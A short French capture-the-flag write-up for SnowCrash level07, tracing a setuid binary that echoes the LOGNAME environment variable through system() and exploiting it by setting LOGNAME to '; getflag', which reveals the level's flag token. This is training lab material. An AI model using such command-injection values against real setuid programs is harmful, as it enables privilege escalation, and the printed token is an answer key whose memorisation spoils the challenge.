# LEVEL07

ls -l : `-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07`

```
level07@SnowCrash:~$ ltrace ./level07 
__libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                              = 2007
geteuid()                              = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280) = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280) = 0
getenv("LOGNAME")                      = "level07"
asprintf(0xbffff744, 0x8048688, 0xbfffff46, 0xb7e5ee55, 0xb7fed280) = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                 = 0
+++ exited (status 0) +++
```

On peut voir l'appel à la variable environnement **LOGNAME** (*getenv("LOGNAME")*).

Éxécution du programme nous affiche : 

```
level07@SnowCrash:~$ ./level07 
level07
```

On peut en déduire que le contenu de la variable environnement est affiché avec la commande **echo**, et qu'il est possible de rajouter une commande.

```
level07@SnowCrash:~$ LOGNAME="; getflag"
level07@SnowCrash:~$ ./level07 

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
